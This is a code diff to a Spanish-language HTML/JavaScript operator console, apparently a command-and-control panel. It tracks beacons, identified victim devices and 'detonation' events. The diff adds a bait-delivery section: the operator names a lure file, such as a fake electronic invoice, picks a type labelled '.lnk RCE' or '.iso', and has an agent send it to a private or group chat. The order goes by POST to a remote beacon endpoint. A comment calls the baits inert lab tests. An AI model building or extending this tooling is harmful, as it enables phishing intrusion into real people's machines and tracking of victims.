@@ -343,6 +343,22 @@ footer .sep{color:#262b33}
       <div class="fabbtn" onclick="dlNombre()">▸ cebo con nombre raro · fidelidad</div>
       <div style="font-size:9px;color:#8b919b;line-height:1.6;margin-top:8px">los cebos son INERTES: no contienen código, no se ejecutan al descargarlos ni al abrirlos en ningún dispositivo. prueban solo la ENTREGA automática. el pack real de detonación se arma con h2/ARMAR-GIFT.ps1 en la máquina víctima Windows.</div>
     </div>
+    <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>ENVÍO DE CEBOS</h2><span class="meta" id="ceboSt">elige el nombre</span></div>
+    <div class="panel"><div style="padding:8px 10px">
+      <div style="font-size:9px;color:#8b919b;line-height:1.6;margin-bottom:6px">el archivo se genera con el nombre que elijas y se envía al chat lab. el agente lo ejecuta y confirma acá.</div>
+      <input id="ceboNombre" placeholder="ej: Factura-electronica" style="width:100%;box-sizing:border-box;background:#121418;border:1px solid #000;color:#e6edf3;font-size:11px;padding:8px;border-radius:2px;font-family:inherit">
+      <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap">
+        <div class="fabbtn" onclick="ceboExt('lnk')">.lnk RCE</div>
+        <div class="fabbtn" onclick="ceboExt('iso')">.iso contenedor</div>
+        <div class="fabbtn" onclick="ceboExt('diagpkg')">.diagpkg inerte</div>
+      </div>
+      <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;align-items:center">
+        <div class="fabbtn" id="ceboChatP" onclick="ceboChat('P')">PRIVADO</div>
+        <div class="fabbtn" id="ceboChatG" onclick="ceboChat('G')">GRUPO</div>
+        <div class="fabbtn red" style="margin-left:auto" onclick="ceboEnviar()">▸ ENVIAR</div>
+      </div>
+      <div id="ceboRes" style="font-size:9px;color:#8b919b;margin-top:8px"></div>
+    </div></div>
     <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>USUARIOS IDENTIFICADOS</h2><span class="meta" id="h2UsersN">0</span></div>
     <div class="panel"><div class="log" id="h2Users"><div style="font-size:9px;color:#5c626c;padding:8px 10px">cada dispositivo/usuario que reporte al C2 aparece acá con su huella única</div></div></div>
     <div class="sech" style="margin-top:10px"><div class="sq"></div><h2>EVENTOS DE DETONACIÓN</h2><span class="meta" id="h2Cnt">0</span></div>
@@ -358,7 +374,7 @@ footer .sep{color:#262b33}
   <span>SYNC <b id="ftSync">--:--:--</b></span><span class="sep">|</span>
   <span>BEACONS <b id="ftB">0</b></span><span class="sep">|</span>
   <span>UPTIME <b id="ftU">00:00:00</b></span><span class="sep">|</span>
-  <span id="ftVer">RC-T20 vRC14 · MOTOR CLONE v13.4</span>
+  <span id="ftVer">RC-T20 vRC15 · MOTOR CLONE v13.4</span>
 </footer>
 <div id="modal">
   <div class="mbox">
@@ -465,6 +481,20 @@ function applyOp(op) {
   switchTab(op === 'h2' ? 'h2' : 'tgts');
 }
 document.querySelectorAll('.opbtn').forEach(b => b.addEventListener('click', () => applyOp(b.dataset.op)));
+let ceboTipo = 'lnk', ceboDest = 'P';
+function ceboExt(t) { ceboTipo = t; $('ceboSt').textContent = 'tipo .' + t + ' → elegí destino'; $('ceboNombre').placeholder = 'ej: Factura-electronica.' + t; }
+function ceboChat(d) { ceboDest = d; $('ceboChatP').style.outline = d === 'P' ? '1px solid #7a4a45' : 'none'; $('ceboChatG').style.outline = d === 'G' ? '1px solid #7a4a45' : 'none'; $('ceboSt').textContent = 'destino ' + (d === 'P' ? 'privado' : 'grupo') + ' → ENVIAR'; }
+function ceboEnviar() {
+  let n = ($('ceboNombre').value || '').trim();
+  if (!n) { $('ceboRes').textContent = 'escribí un nombre'; return; }
+  if (n.slice(-(ceboTipo.length + 1)) !== '.' + ceboTipo) n = n + '.' + ceboTipo;
+  const pedido = { nombre: n, tipo: '.' + ceboTipo, chat: ceboDest === 'P' ? 'privado' : 'grupo', ts: hhmmss() };
+  $('ceboRes').textContent = 'enviando pedido...';
+  fetch('https://base44.app/api/apps/6ad92becd6c36ebeb23d3e71/functions/t20Beacon', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ marker: 'H2-CEBO-PEDIDO', ua: 'consola-owner', extra: JSON.stringify(pedido) }) })
+    .then(() => { $('ceboRes').textContent = '✓ pedido: ' + n + ' → ' + pedido.chat + '. el agente lo manda y confirma'; $('ceboRes').style.color = '#f2d3d1'; })
+    .catch(e => { $('ceboRes').textContent = 'fallo: ' + e.message; $('ceboRes').style.color = '#f2d3d1'; });
+}
+ceboExt('lnk');
 function renderH2() {
   const has = p => S.h2.some(e => String(e.m).indexOf(p) === 0);
   if (!S.h2.length) return;
@@ -926,7 +956,7 @@ setInterval(() => {
 }, 1000);
 
 applyOp(localStorage.getItem('t20v8_op') || 't20');
-logAdd('RC-T20 vRC14 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
+logAdd('RC-T20 vRC15 en línea · motor de clonación v13.4 · C2 enlazado', 'warn');
 renderAll();
 poll();
 </script>
